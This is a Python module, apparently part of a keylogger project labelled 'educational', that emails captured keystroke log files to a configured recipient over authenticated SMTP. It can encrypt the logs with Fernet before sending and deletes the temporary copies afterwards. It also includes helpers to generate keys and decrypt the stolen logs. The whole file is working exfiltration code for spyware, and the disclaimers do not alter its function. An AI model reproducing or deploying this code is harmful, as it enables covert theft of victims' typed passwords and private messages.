"""
Email Transmitter Module for Educational Keylogger
===================================================
Handles secure email transmission of log files via SMTP.

WARNING: This is for EDUCATIONAL PURPOSES ONLY.
"""

import smtplib
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
from cryptography.fernet import Fernet


class EmailTransmitter:
    """
    Handles email transmission of log files via SMTP.
    """

    def __init__(self, smtp_server, smtp_port, sender_email, sender_password,
                 recipient_email, encryption_enabled=False, encryption_key=None):
        """
        Initialize the email transmitter.

        Args:
            smtp_server: SMTP server address (e.g., smtp.gmail.com)
            smtp_port: SMTP port (usually 587 for TLS)
            sender_email: Sender's email address
            sender_password: Sender's email password or app password
            recipient_email: Recipient's email address
            encryption_enabled: Whether to encrypt attachments
            encryption_key: Encryption key if encryption is enabled
        """
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.sender_email = sender_email
        self.sender_password = sender_password
        self.recipient_email = recipient_email
        self.encryption_enabled = encryption_enabled

        # Initialize encryption if enabled
        if encryption_enabled and encryption_key:
            self.cipher = Fernet(encryption_key.encode() if isinstance(encryption_key, str) else encryption_key)
        else:
            self.cipher = None

    def encrypt_file(self, file_path):
        """
        Encrypt a file using Fernet encryption.

        Args:
            file_path: Path to the file to encrypt

        Returns:
            Path to the encrypted file
        """
        if not self.encryption_enabled or not self.cipher:
            return file_path

        try:
            # Read the file
            with open(file_path, 'rb') as f:
                data = f.read()

            # Encrypt the data
            encrypted_data = self.cipher.encrypt(data)

            # Save encrypted file
            encrypted_path = file_path + '.encrypted'
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted_data)

            return encrypted_path
        except Exception as e:
            print(f"[ERROR] Encryption failed: {e}")
            return file_path

    def send_logs(self, log_files, session_id=None):
        """
        Send log files via email.

        Args:
            log_files: List of file paths to send
            session_id: Optional session identifier

        Returns:
            True if successful, False otherwise
        """
        try:
            # Create message
            msg = MIMEMultipart()
            msg['From'] = self.sender_email
            msg['To'] = self.recipient_email
            msg['Subject'] = f"Keylogger Report - {session_id or datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

            # Email body
            body = f"""
Educational Keylogger Report
============================

Session ID: {session_id or 'N/A'}
Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Files attached: {len(log_files)}

{'[ENCRYPTED]' if self.encryption_enabled else '[PLAINTEXT]'}

---
This is an automated report from an educational keylogger project.
For cybersecurity learning purposes only.
"""
            msg.attach(MIMEText(body, 'plain'))

            # Attach files
            files_to_send = []
            for file_path in log_files:
                if os.path.exists(file_path):
                    # Encrypt if needed
                    if self.encryption_enabled:
                        file_to_attach = self.encrypt_file(file_path)
                        files_to_send.append(file_to_attach)
                    else:
                        file_to_attach = file_path

                    # Attach the file
                    filename = os.path.basename(file_to_attach)
                    with open(file_to_attach, 'rb') as attachment:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(attachment.read())

                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', f'attachment; filename={filename}')
                    msg.attach(part)

            # Send email
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls()
                server.login(self.sender_email, self.sender_password)
                server.send_message(msg)

            # Clean up encrypted files
            if self.encryption_enabled:
                for encrypted_file in files_to_send:
                    if encrypted_file.endswith('.encrypted') and os.path.exists(encrypted_file):
                        os.remove(encrypted_file)

            return True

        except smtplib.SMTPAuthenticationError:
            print("[ERROR] SMTP Authentication failed. Check your email and password.")
            return False
        except smtplib.SMTPException as e:
            print(f"[ERROR] SMTP error: {e}")
            return False
        except Exception as e:
            print(f"[ERROR] Failed to send email: {e}")
            return False

    def test_connection(self):
        """
        Test the SMTP connection and authentication.

        Returns:
            True if connection successful, False otherwise
        """
        try:
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls()
                server.login(self.sender_email, self.sender_password)
            print("[SUCCESS] SMTP connection test successful!")
            return True
        except smtplib.SMTPAuthenticationError:
            print("[ERROR] SMTP Authentication failed. Check your credentials.")
            return False
        except Exception as e:
            print(f"[ERROR] Connection test failed: {e}")
            return False


def generate_encryption_key():
    """
    Generate a new Fernet encryption key.

    Returns:
        Base64-encoded encryption key as string
    """
    key = Fernet.generate_key()
    return key.decode()


def decrypt_file(encrypted_file_path, encryption_key, output_path=None):
    """
    Decrypt a file that was encrypted by the keylogger.

    Args:
        encrypted_file_path: Path to the encrypted file
        encryption_key: Encryption key (string or bytes)
        output_path: Optional output path for decrypted file

    Returns:
        Path to decrypted file
    """
    try:
        # Initialize cipher
        cipher = Fernet(encryption_key.encode() if isinstance(encryption_key, str) else encryption_key)

        # Read encrypted file
        with open(encrypted_file_path, 'rb') as f:
            encrypted_data = f.read()

        # Decrypt
        decrypted_data = cipher.decrypt(encrypted_data)

        # Save decrypted file
        if output_path is None:
            output_path = encrypted_file_path.replace('.encrypted', '.decrypted')

        with open(output_path, 'wb') as f:
            f.write(decrypted_data)

        print(f"[SUCCESS] File decrypted: {output_path}")
        return output_path

    except Exception as e:
        print(f"[ERROR] Decryption failed: {e}")
        return None


if __name__ == "__main__":
    # Test/utility functions
    import sys

    if len(sys.argv) > 1:
        if sys.argv[1] == "generate-key":
            key = generate_encryption_key()
            print(f"Generated encryption key:\n{key}")
            print("\nAdd this key to your .env file as ENCRYPTION_KEY")

        elif sys.argv[1] == "decrypt" and len(sys.argv) >= 4:
            encrypted_file = sys.argv[2]
            key = sys.argv[3]
            decrypt_file(encrypted_file, key)

        else:
            print("Usage:")
            print("  python email_transmitter.py generate-key")
            print("  python email_transmitter.py decrypt <file> <key>")
    else:
        print("Email Transmitter Module - Educational Keylogger")
        print("Usage:")
        print("  python email_transmitter.py generate-key")
        print("  python email_transmitter.py decrypt <file> <key>")
